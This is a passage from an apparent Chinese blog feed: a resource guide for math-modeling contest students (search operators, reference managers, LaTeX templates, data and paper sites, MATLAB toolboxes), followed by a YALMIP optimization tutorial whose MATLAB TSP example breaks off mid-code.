密码：cqj5</p><p>现在我假设你已经能翻墙了，个人推荐使用搜索引擎的顺序：</p><p><strong>Google&gt;360搜索&gt;百度   (微软的bing我不知道怎么样)</strong></p><p>接下来就是非常重要的三条搜索指令:</p><ul><li>filetype</li><li>intitle</li><li>site</li></ul><p>上述三条搜索指令请一定一定要掌握，所有的指令都是command:content形式。如<strong>filetype</strong>:xls，以天气数据为例,可以得到下图</p><p><img data-src="https://pic.superbed.cn/item/5cfba717451253d178d8f5b3.png" alt="天气数据.png"></p><p>相信你已经懂了这个指令的意义了，对于天气数据关键字，只搜索xls类型文件。这对于搜索论文(pdf类型文件)，数据(xls,csv,txt等)，非常有用。基本上是我用得最多的指令之一了。</p><p>在如<strong>intitle</strong>指令，这个指令的意思是，在我所搜索的条目中，标题一定要包含:后面的内容，如:</p><p><img data-src="https://pic.superbed.cn/item/5cfba896451253d178d907ae.png" alt="weather.png"></p><p>可以看到，所有条目全部包含”weather”关键字。其实还有个指令-**””（英文的双引号)**，把所要搜索的内容用””包含起来，所得到的结果是，所搜索的内容必须包含这个关键字，不限于内容还是标题。如下图:</p><p><img data-src="https://pic2.superbed.cn/item/5cfba89a451253d178d90819.png" alt="RavenXr.png"></p><p>可以看到，从搜索结果来看，只要内容包含“Raven XR”就会显示。</p><p>最后在介绍很重要的指令<strong>site</strong>。这条指令的意思是，所要搜索的内容只在site:后的网站中进行搜索。</p><p>如，只在CSDN中搜索数据结构:</p><p><img data-src="https://pic1.superbed.cn/item/5cfba89d451253d178d90871.png" alt="site指令.png"></p><p>所有的指令可以交叉使用，这就留给你自己去探讨了，如果你想学习其他有用的指令，也可去查一下哦，我认为最常用的3个就是上面这3个了。</p><p>综合的搜索引擎：<span class="exturl" data-url="aHR0cDovL3NlYXJjaC5jaG9uZ2J1bHVvLmNvbS8=" title="http://search.chongbuluo.com/">http://search.chongbuluo.com/<i class="fa fa-external-link"></i></span></p><h4 id="文献管理工具"><a href="#文献管理工具" class="headerlink" title="文献管理工具"></a>文献管理工具</h4><p>就我个人来说，还是推荐综合使用Zotero和EndNote两款文献管理工具：</p><ul><li><p>Zotero的优点在于提供chrome插件，便于保存资料，也提供汉化版本，提供在线笔记，团队文献资料共享。Zotero的具体使用可参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cueWFuZ3poaXBpbmcuY29tL3RlY2gvem90ZXJvMS5odG1s" title="https://www.yangzhiping.com/tech/zotero1.html">https://www.yangzhiping.com/tech/zotero1.html<i class="fa fa-external-link"></i></span></p></li><li><p>EndNote的优点在于支持各种格式导出，内置文献标记，排序，文献重要程度排行标记等等。但是不支持汉化，而且略微卡顿。</p></li></ul><p>如果你使用Word排版的话，<strong>两款工具都提供文献插入标号和自动更新</strong>，不过好像Zotero才支持国标吧，这点你可以自己去查实咯。</p><h4 id="团队协作"><a href="#团队协作" class="headerlink" title="团队协作"></a>团队协作</h4><p>如果你不想所有数据全丢在QQ群然后各种重命名的话，推荐<strong>坚果云</strong>，把相关资料共享，然后建立一个以自己名字为名的文件夹，然后大家都共享咯。</p><h4 id="到底使用Word还是Latex排版？"><a href="#到底使用Word还是Latex排版？" class="headerlink" title="到底使用Word还是Latex排版？"></a>到底使用Word还是Latex排版？</h4><p>虽然我个人超爱Latex的文字排版，但是我还是建议参加国赛的同学，在不熟练使用Latex的情况下，除了<strong>书写公式</strong>以外，还是老老实实用Word吧。</p><p>对于要使用Latex的同学，这里给个模板：</p><p><span class="exturl" data-url="aHR0cDovL3d3dy5sYXRleHN0dWRpby5uZXQvYXJjaGl2ZXMvMTA4MzQuaHRtbA==" title="http://www.latexstudio.net/archives/10834.html">http://www.latexstudio.net/archives/10834.html<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xhdGV4c3R1ZGlvL0NVTUNNVGhlc2lz" title="https://github.com/latexstudio/CUMCMThesis">https://github.com/latexstudio/CUMCMThesis<i class="fa fa-external-link"></i></span></p><p>参加美赛的同学，就更推荐Latex一点了，因为Latex对英文的支持是相当好的，排版出来的感觉也是很美的，只管写内容不关心排版不是很爽吗（反观没学习Latex之前，在论文写作完成后，排版总是会花费很长的时间，所以参加美赛的同学学习一下Latex还是不错的），美赛模板如下：</p><p><span class="exturl" data-url="aHR0cDovL3d3dy5sYXRleHN0dWRpby5uZXQvYXJjaGl2ZXMvOTMzMy5odG1s" title="http://www.latexstudio.net/archives/9333.html">http://www.latexstudio.net/archives/9333.html<i class="fa fa-external-link"></i></span> </p><p>如果使用Latex排版，我想<strong>制表</strong>应该是所有使用Latex的人一个诟病，所以这里提供一个解决方案：</p><p><span class="exturl" data-url="aHR0cDovL3d3dy50YWJsZXNnZW5lcmF0b3IuY29tLw==" title="http://www.tablesgenerator.com/">http://www.tablesgenerator.com/<i class="fa fa-external-link"></i></span></p><p>如果你使用Word排版，<strong>那么书写公式一定让你头疼</strong>，<strong>那么我劝你还是花费一天去学下Latex公式书写（其他的什么都别学）然后使用pandoc转成word公式（不要害怕，安装pandoc很简单，转化也只需要一条命令行）</strong>，当然也可以使用<strong>MathType</strong>。</p><p>如何将latex公式转为word公式？我写了篇博文和配套视频，可以参考：<br>[post cid=”145” /]</p><h4 id="代码搜索"><a href="#代码搜索" class="headerlink" title="代码搜索"></a>代码搜索</h4><p><strong>Github</strong>当然是首推的：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLw==" title="https://github.com/">https://github.com/<i class="fa fa-external-link"></i></span></p><p><strong>联合开发网</strong>：<span class="exturl" data-url="aHR0cDovL3d3dy5wdWRuLmNvbS8=" title="http://www.pudn.com/">http://www.pudn.com<i class="fa fa-external-link"></i></span></p><p>codeproject：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY29kZXByb2plY3QuY29tLw==" title="https://www.codeproject.com/">https://www.codeproject.com/<i class="fa fa-external-link"></i></span></p><p>oh，还有个<strong>我自己整理的代码</strong>（不算搜索，但是常用的代码还是有的）：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3p6YmIxMTk5L01hdGhlbWF0aWNhbC1Nb2RlbGluZw==" title="https://github.com/zzbb1199/Mathematical-Modeling">https://github.com/zzbb1199/Mathematical-Modeling<i class="fa fa-external-link"></i></span></p><h4 id="一些数学建模的网站"><a href="#一些数学建模的网站" class="headerlink" title="一些数学建模的网站"></a>一些数学建模的网站</h4><p><span class="exturl" data-url="aHR0cDovL252ZXl1bi5jb20v" title="http://nveyun.com/">http://nveyun.com/<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cDovL3d3dy5tY20uZGVwdC5jY3V0LmVkdS5jbi8=" title="http://www.mcm.dept.ccut.edu.cn/">http://www.mcm.dept.ccut.edu.cn/<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cDovL3d3dy5tY20uZWR1LmNuLw==" title="http://www.mcm.edu.cn/">http://www.mcm.edu.cn/<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cDovL3d3dy5tYWRpby5uZXQvZm9ydW0ucGhw" title="http://www.madio.net/forum.php">http://www.madio.net/forum.php<i class="fa fa-external-link"></i></span></p><h4 id="论文搜索"><a href="#论文搜索" class="headerlink" title="论文搜索"></a>论文搜索</h4><p>一个综合的网站:<span class="exturl" data-url="aHR0cDovL3NjaG9sYXIuY2hvbmdidWx1by5jb20v" title="http://scholar.chongbuluo.com/">http://scholar.chongbuluo.com/<i class="fa fa-external-link"></i></span></p><p><strong>Google学术</strong>:<span class="exturl" data-url="aHR0cHM6Ly9zY2hvbGFyLmdvb2dsZS5jby5qcC9zY2hocD9obD16aC1DTg==" title="https://scholar.google.co.jp/schhp?hl=zh-CN">https://scholar.google.co.jp/schhp?hl=zh-CN<i class="fa fa-external-link"></i></span></p><p><strong>知网</strong>:<span class="exturl" data-url="aHR0cDovL2tucy5jbmtpLm5ldC9rbnMvYnJpZWYvZGVmYXVsdF9yZXN1bHQuYXNweA==" title="http://kns.cnki.net/kns/brief/default_result.aspx">http://kns.cnki.net/kns/brief/default_result.aspx<i class="fa fa-external-link"></i></span></p><p><strong>维普</strong>:<span class="exturl" data-url="aHR0cDovL3Fpa2FuLmNxdmlwLmNvbS8=" title="http://qikan.cqvip.com/">http://qikan.cqvip.com/<i class="fa fa-external-link"></i></span></p><p>万方:<span class="exturl" data-url="aHR0cDovL3d3dy53YW5mYW5nZGF0YS5jb20uY24vaW5kZXguaHRtbA==" title="http://www.wanfangdata.com.cn/index.html">http://www.wanfangdata.com.cn/index.html<i class="fa fa-external-link"></i></span></p><p>有很多英文的站点，但是做数模嘛，其实好好用好上面的几个网站就够了。</p><h4 id="数据搜索网站"><a href="#数据搜索网站" class="headerlink" title="数据搜索网站"></a>数据搜索网站</h4><p><strong>国家统计局</strong>：<span class="exturl" data-url="aHR0cDovL3d3dy5zdGF0cy5nb3YuY24vdGpzai9uZHNqLw==" title="http://www.stats.gov.cn/tjsj/ndsj/">http://www.stats.gov.cn/tjsj/ndsj/<i class="fa fa-external-link"></i></span></p><p><strong>国际数据</strong>:<span class="exturl" data-url="aHR0cDovL2RhdGEuc3RhdHMuZ292LmNuL2luZGV4Lmh0bQ==" title="http://data.stats.gov.cn/index.htm">http://data.stats.gov.cn/index.htm<i class="fa fa-external-link"></i></span></p><p>统计年鉴：<span class="exturl" data-url="aHR0cDovL3d3dy55ZWFyYm9va2NoaW5hLmNvbS8=" title="http://www.yearbookchina.com/">http://www.yearbookchina.com/<i class="fa fa-external-link"></i></span></p><p>**数析网(很推荐)**：<span class="exturl" data-url="aHR0cDovL3d3dy50anNxbC5jb20vaW5kZXguYXNweA==" title="http://www.tjsql.com/index.aspx">http://www.tjsql.com/index.aspx<i class="fa fa-external-link"></i></span></p><p>搜数：<span class="exturl" data-url="aHR0cDovL3d3dy5zb3Nob28uY29tL2luZGV4LmRv" title="http://www.soshoo.com/index.do">http://www.soshoo.com/index.do<i class="fa fa-external-link"></i></span></p><p>谷歌数据集：<span class="exturl" data-url="aHR0cHM6Ly90b29sYm94Lmdvb2dsZS5jb20vZGF0YXNldHNlYXJjaA==" title="https://toolbox.google.com/datasetsearch">https://toolbox.google.com/datasetsearch<i class="fa fa-external-link"></i></span></p><p>中国统计信息网：<span class="exturl" data-url="aHR0cDovL3d3dy50amNuLm9yZy8=" title="http://www.tjcn.org/">http://www.tjcn.org/<i class="fa fa-external-link"></i></span></p><p>优易数据：<span class="exturl" data-url="aHR0cHM6Ly93d3cueW91ZWRhdGEuY29tLw==" title="https://www.youedata.com/">https://www.youedata.com/<i class="fa fa-external-link"></i></span></p><p>别的博主整理的：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2p1YW5qdWFuMTMxNC9hcnRpY2xlL2RldGFpbHMvNTA4OTU3OTM=" title="https://blog.csdn.net/juanjuan1314/article/details/50895793">https://blog.csdn.net/juanjuan1314/article/details/50895793<i class="fa fa-external-link"></i></span></p><h4 id="查重"><a href="#查重" class="headerlink" title="查重"></a>查重</h4><p><strong>PaperFree</strong>:<span class="exturl" data-url="aHR0cHM6Ly93d3cucGFwZXJmcmVlLmNuLw==" title="https://www.paperfree.cn/">https://www.paperfree.cn/<i class="fa fa-external-link"></i></span></p><p>大雅：<span class="exturl" data-url="aHR0cDovL2RzYS5kYXlhaW5mby5jb20v" title="http://dsa.dayainfo.com/">http://dsa.dayainfo.com/<i class="fa fa-external-link"></i></span></p><p>知网:<span class="exturl" data-url="aHR0cDovL3d3dy5jbmtpLmNuL2ZyZWUuaHRtbA==" title="http://www.cnki.cn/free.html">http://www.cnki.cn/free.html<i class="fa fa-external-link"></i></span></p><p>PaperYY:<span class="exturl" data-url="aHR0cHM6Ly93d3cucGFwZXJ5eS5jb20v" title="https://www.paperyy.com/">https://www.paperyy.com/<i class="fa fa-external-link"></i></span></p><h4 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h4><p>翻译狗:<span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFueWlnb3UubmV0Lw==" title="https://www.fanyigou.net/">https://www.fanyigou.net/<i class="fa fa-external-link"></i></span></p><p>谷歌:<span class="exturl" data-url="aHR0cHM6Ly90cmFuc2xhdGUuZ29vZ2xlLmNuLw==" title="https://translate.google.cn/">https://translate.google.cn/<i class="fa fa-external-link"></i></span></p><p><strong>百度</strong>:<span class="exturl" data-url="aHR0cHM6Ly9mYW55aS5iYWlkdS5jb20vP2FsZHR5cGU9MTYwNDcjYXV0by96aA==" title="https://fanyi.baidu.com/?aldtype=16047#auto/zh">https://fanyi.baidu.com/?aldtype=16047#auto/zh<i class="fa fa-external-link"></i></span></p><p>有道:<span class="exturl" data-url="aHR0cDovL2ZhbnlpLnlvdWRhby5jb20v" title="http://fanyi.youdao.com/">http://fanyi.youdao.com/<i class="fa fa-external-link"></i></span></p><p>虽然很多人喜欢谷歌，但是个人更喜欢百度。</p><p>对了,有道的客户端也是支持pdf翻译的，如图:</p><p><img data-src="https://pic.superbed.cn/item/5cfba8a0451253d178d908b8.png" alt="有道翻译.png"></p><h4 id="MATLAB工具箱"><a href="#MATLAB工具箱" class="headerlink" title="MATLAB工具箱"></a>MATLAB工具箱</h4><p>gatbx工具箱(遗传算法工具箱):<span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5jc2RuLm5ldC9kb3dubG9hZC9xcV8zNTEwOTA5Ni8xMDU1NDc4Ng==" title="https://download.csdn.net/download/qq_35109096/10554786">https://download.csdn.net/download/qq_35109096/10554786<i class="fa fa-external-link"></i></span></p><p><strong>yalmip工具箱(优化求解器）</strong>:<span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5jc2RuLm5ldC9kb3dubG9hZC9xcV8zNTEwOTA5Ni8xMDU1NDc4Mw==" title="https://download.csdn.net/download/qq_35109096/10554783">https://download.csdn.net/download/qq_35109096/10554783<i class="fa fa-external-link"></i></span> (记住一定要配置<strong>gurobi</strong>)</p><p>lpsolve工具箱(优化求解器):<span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5jc2RuLm5ldC9kb3dubG9hZC9xcV8zNTEwOTA5Ni8xMDU1NDc3OQ==" title="https://download.csdn.net/download/qq_35109096/10554779">https://download.csdn.net/download/qq_35109096/10554779<i class="fa fa-external-link"></i></span></p><p>libsvm工具箱(更好的SVM工具箱):<span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5jc2RuLm5ldC9kb3dubG9hZC9xcV8zNTEwOTA5Ni8xMDU1NDc4Mg==" title="https://download.csdn.net/download/qq_35109096/10554782">https://download.csdn.net/download/qq_35109096/10554782<i class="fa fa-external-link"></i></span></p><h4 id="一些软件分享"><a href="#一些软件分享" class="headerlink" title="一些软件分享"></a>一些软件分享</h4><p>MATLAB2014:链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXYtLTVrdmdYV0VnMzRNV2pWRVdGY2c=" title="https://pan.baidu.com/s/1v--5kvgXWEg34MWjVEWFcg">https://pan.baidu.com/s/1v--5kvgXWEg34MWjVEWFcg<i class="fa fa-external-link"></i></span> 密码：z722</p><p>SPSS:链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMVk4bHp0WFhvNXpHY1B2Q1dma0pOS3c=" title="https://pan.baidu.com/s/1Y8lztXXo5zGcPvCWfkJNKw">https://pan.baidu.com/s/1Y8lztXXo5zGcPvCWfkJNKw<i class="fa fa-external-link"></i></span> 密码：xabq</p><h4 id="一些视频教程"><a href="#一些视频教程" class="headerlink" title="一些视频教程"></a>一些视频教程</h4><p>VISIO：链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXFtNFR3Tk14UjJ5VzJVVG9sYjVsZUE=" title="https://pan.baidu.com/s/1qm4TwNMxR2yW2UTolb5leA">https://pan.baidu.com/s/1qm4TwNMxR2yW2UTolb5leA<i class="fa fa-external-link"></i></span> 密码：u8yt</p><p>VISSIM：链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMUQ3RWJQRlJXQ29GWVVLZF9ObFJqT2c=" title="https://pan.baidu.com/s/1D7EbPFRWCoFYUKd_NlRjOg">https://pan.baidu.com/s/1D7EbPFRWCoFYUKd_NlRjOg<i class="fa fa-external-link"></i></span> 密码：d70j</p><h4 id="关于数据可视化"><a href="#关于数据可视化" class="headerlink" title="关于数据可视化"></a>关于数据可视化</h4><p>有些同学很想把图做得精美一点，ok，我理解，毕竟我也是这样过来的，但是我不推荐把过多的时间放在这上面。但是如果有时间，可以试试以下方式：</p><ol><li><strong>Excel+合理配色</strong>（各类颜色：<span class="exturl" data-url="aHR0cHM6Ly93d3cubWF0ZXJpYWx1aS5jby9jb2xvcnMlRUYlQkMlODk=" title="https://www.materialui.co/colors%EF%BC%89">https://www.materialui.co/colors）<i class="fa fa-external-link"></i></span></li><li>会js的同学使用：<span class="exturl" data-url="aHR0cDovL2VjaGFydHMuYmFpZHUuY29tL2ZlYXR1cmUuaHRtbA==" title="http://echarts.baidu.com/feature.html">http://echarts.baidu.com/feature.html<i class="fa fa-external-link"></i></span></li><li>会python的同学使用:<span class="exturl" data-url="aHR0cDovL3B5ZWNoYXJ0cy5vcmcvIy8=" title="http://pyecharts.org/#/">http://pyecharts.org/#/<i class="fa fa-external-link"></i></span></li></ol><p>呼，或许有点多了，不过我觉得重要的还是加粗了。有需要的同学可以看看吧。那，，，就这样了呗。</p><h5 id="最后，预祝所有学弟学妹们建模都能取得好成绩。"><a href="#最后，预祝所有学弟学妹们建模都能取得好成绩。" class="headerlink" title="最后，预祝所有学弟学妹们建模都能取得好成绩。"></a>最后，预祝所有学弟学妹们建模都能取得好成绩。</h5>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 心得 </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yalmip使用学习</title>
      <link href="/archives/8df54bf5.html"/>
      <url>/archives/8df54bf5.html</url>
      
        <content type="html"><![CDATA[<h2 id="yalmip学习"><a href="#yalmip学习" class="headerlink" title="yalmip学习"></a>yalmip学习</h2><h3 id="1-yalmip简介"><a href="#1-yalmip简介" class="headerlink" title="1. yalmip简介"></a>1. yalmip简介</h3><h4 id="1-1-什么是yalmip"><a href="#1-1-什么是yalmip" class="headerlink" title="1.1 什么是yalmip"></a>1.1 什么是yalmip</h4><blockquote><p>yalmip是由Lofberg开发的一种免费的优化求解工具，其最大特色在于集成许多外部的最优化求解器，形成一种统一的建模求解语言，提供了Matlab的调用API，减少学习者学习成本。</p></blockquote><a id="more"></a><h4 id="1-2-yalmip安装方式"><a href="#1-2-yalmip安装方式" class="headerlink" title="1.2 yalmip安装方式"></a>1.2 yalmip安装方式</h4><p>这里以<strong>MATLAB</strong>的安装方式为例，在<span class="exturl" data-url="aHR0cHM6Ly95YWxtaXAuZ2l0aHViLmlvLw==" title="https://yalmip.github.io/">官网<i class="fa fa-external-link"></i></span>上下载最新包，将其解压至<code>matlab</code>的<code>toolbox</code>文件夹下（当然也放置在其他文件夹），打开<code>matlab</code>软件添加Path路径即可。最后键入<code>which sdpvar</code>命令，显示<code>sdpvar</code>路径则安装成功。</p><h3 id="2-yalmip求解优化问题的四部曲"><a href="#2-yalmip求解优化问题的四部曲" class="headerlink" title="2.yalmip求解优化问题的四部曲"></a>2.yalmip求解优化问题的四部曲</h3><h4 id="2-1-创建决策变量"><a href="#2-1-创建决策变量" class="headerlink" title="2.1 创建决策变量"></a>2.1 创建决策变量</h4><p><code>yalmip</code>一共有三种方式创建决策变量，分别为:</p><ol><li><code>sdpvar</code>-创建实数型决策变量</li><li><code>intbar</code>-创建整数型决策变量</li><li><code>binvar</code>-创建<code>0/1</code>型决策变量</li></ol><p>不过值得注意的是，在创建<code>n*n</code>的决策变量时，<code>yalmip</code>默认是对称方阵，所以要创建非对称方针时，需要这样写：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxvar(n,n,&#x27;full&#x27;)</span><br></pre></td></tr></table></figure><h4 id="2-2-添加约束条件"><a href="#2-2-添加约束条件" class="headerlink" title="2.2 添加约束条件"></a>2.2 添加约束条件</h4><p>比起<code>matlab</code>自带的各种优化函数所要写明的约束条件，<code>yalmip</code>的约束条件写起来是非常舒适直观的。</p><p>比如要写入<code>0&lt;=x1+x2+x3&lt;=1</code>。</p><p>那么可以这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% 创建决策变量</span><br><span class="line">x = sdpvar(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">% 添加约束条件</span><br><span class="line">C = [<span class="number">0</span>&lt;=x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)&lt;=<span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>是不是非常爽呢。这才是人类语言（和我初见python的感觉差不多）</p><h4 id="2-3-参数配置"><a href="#2-3-参数配置" class="headerlink" title="2.3 参数配置"></a>2.3 参数配置</h4><p>关于参数设置，我们大多数是用来设置求解器<code>solver</code>的，当然还有其它的选项，可以通过<code>doc sdpsettings</code>查看。</p><h4 id="2-4-求解问题"><a href="#2-4-求解问题" class="headerlink" title="2.4 求解问题"></a>2.4 求解问题</h4><p>最后就是求解问题了。</p><p>首先要明确求解目标<code>z</code>，<code>yalmip</code>默认是求解最小值问题，所以遇到求解最大值的问题，只需要在原问题的基础上添加一个负号即可。</p><p>求解调用格式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimize(target,constraints,opstions)</span><br></pre></td></tr></table></figure><h4 id="2-5-几个常用的其它指令"><a href="#2-5-几个常用的其它指令" class="headerlink" title="2.5 几个常用的其它指令"></a>2.5 几个常用的其它指令</h4><ol><li><code>check</code>：可以检查约束条件是否被满足（检查约束条件的余值）</li><li><code>value</code>：可以查看变量或表达式的值</li><li><code>assign</code>: 可以给变量赋值，这个命令调试时很重要</li></ol><h3 id="3-举两个栗子"><a href="#3-举两个栗子" class="headerlink" title="3.举两个栗子"></a>3.举两个栗子</h3><h4 id="3-1-简单例子"><a href="#3-1-简单例子" class="headerlink" title="3.1 简单例子"></a>3.1 简单例子</h4><p>如题</p><p>$$<br>\begin{equation}<br>z = max(\frac{x_1+2x_2}{2x_1+x_2}) \\<br>\left\{<br>             \begin{array}{c}<br>               x_1 + x_2 \ge 2    \\<br>               x_2 - x_1 \le 1    \\<br>               x_1 \le 1<br>             \end{array}<br>\right.<br>\end{equation}<br>$$</p><p>代码如下，附有详细解释，就不说明了：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 清除工作区</span></span><br><span class="line">clear;clc;close all;</span><br><span class="line"><span class="comment">% 创建决策变量</span></span><br><span class="line">x = sdpvar(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">% 添加约束条件</span></span><br><span class="line">C = [</span><br><span class="line">    x(<span class="number">1</span>) + x(<span class="number">2</span>)  &gt;= <span class="number">2</span></span><br><span class="line">    x(<span class="number">2</span>)-x(<span class="number">1</span>) &lt;=<span class="number">1</span></span><br><span class="line">    x(<span class="number">1</span>)&lt;=<span class="number">1</span></span><br><span class="line">    ];</span><br><span class="line">ops = sdpsettings(<span class="string">&#x27;verbose&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">% 目标函数</span></span><br><span class="line">z = -(x(<span class="number">1</span>)+<span class="number">2</span>*x(<span class="number">2</span>))/(<span class="number">2</span>*x(<span class="number">1</span>)+x(<span class="number">2</span>)); <span class="comment">% 注意这是求解最大值</span></span><br><span class="line"><span class="comment">% 求解</span></span><br><span class="line">result = optimize(C,z,ops);</span><br><span class="line"><span class="keyword">if</span> result.problem == <span class="number">0</span> <span class="comment">% problem =0 代表求解成功</span></span><br><span class="line">    value(x)</span><br><span class="line">    -value(z)   <span class="comment">% 反转</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">disp</span>(<span class="string">&#x27;求解出错&#x27;</span>);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>求解结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ans =</span><br><span class="line"></span><br><span class="line">   <span class="number">0.500000999998279</span>   <span class="number">1.500000333331623</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans =</span><br><span class="line"></span><br><span class="line">   <span class="number">1.399999360001426</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-2-解决经典的TSP问题"><a href="#3-2-解决经典的TSP问题" class="headerlink" title="3.2 解决经典的TSP问题"></a>3.2 解决经典的TSP问题</h4><p>关于TSP的理论，这里我就不详细介绍了，百度有很多。在遇到yalmip之前，我学习的求解TSP的第一解法就是利用lingo来求解，后来学习了几种智能算法，如遗传算法，模拟退火，蚁群算法等等都可以解决这个问题。现在，学习了yalmip之后，我们可以完全抛弃lingo那种简陋的ide。废话不多说，先贴上约束条件：</p><p>$$<br>\min Z = \sum_{i=1}^{n}\sum_{j=1}^{n} d_{ij}x_{ij}   \\<br>    s.t. \left\{<br>    \begin{array}{c}<br>        \sum_{i=1,i\neq j}^{n}x_{ij} = 1,\qquad j = 1,\cdots,n      \\<br>        \sum_{j=1,j\neq i}^{n}x_{ij} = 1,\qquad i = 1,\cdots,n\\<br>        u_i-u_j + nx_{ij} \le n-1,\qquad 1&lt; i\neq j \le n   \\<br>        x_{ij} = 0 \text{或} 1,\qquad u,j=1,\cdots,n  \\<br>        u_i\text{为实数},\qquad i=1,\cdots,n<br>    \end{array}<br>    \right.<br>$$</p><p>再来看看代码：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 利用yamlip求解TSP问题</span></span><br><span class="line">clear;clc;close all;</span><br><span class="line">d = load(<span class="string">&#x27;tsp_dist_matrix.txt&#x27;</span>)&#x27;;</span><br><span class="line">n = <span class="built_in">size</span>(d,<span class="number">1</span>);</span><br><span class="line"><span class="comment">% 决策变量</span></span><br><span class="line">x = binvar(n,n,<span class="string">&#x27;full&#x27;</span>);</span><br><span class="line">u = sdpvar(<span class="number">1</span>,n);</span><br><span class="line"><span class="comment">% 目标</span></span><br><span class="line">z = sum(sum(d.*x));</span><br><span class="line"><span class="comment">% 约束添加</span></span><br><span class="line">C = [];</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">j</span> = <span class="number">1</span>:n</span><br><span class="line">    s = sum(x(:,<span class="built_in">j</span>))-x(<span class="built_in">j</span>,<span class="built_in">j</span>);</span><br><span class="line">    C = [C,   s  == <span class="number">1</span>];</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:n</span><br><span class="line">    s = sum(x(<span class="built_in">i</span>,:)) - x(<span class="built_in">i</span>,<span class="built_in">i</span>);</span><br><span class="line">    C = [C, s  == <span class="number">1</span>];</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">2</span>:n</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">j</span> = <span class="number">2</span>:n</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">i</span>~=<span class="built_in">j</span></span><br><span class="line">            C = [C,u(<span class="built_in">i</span>)-u(<span class="built_in">j</span>) + n*x(<span class="built_in">i</span>,<span class="built_in">j</span>)&lt;=n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">% 参数设置</span></span><br><span class="line">ops = sdpsettings(<span class="string">&#x27;verbose&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">% 求解</span></span><br><span class="line">result= optimize(C,z,ops);</span><br><span class="line"><span class="keyword">if</span> result.problem == <span class="number">0</span></span><br><span 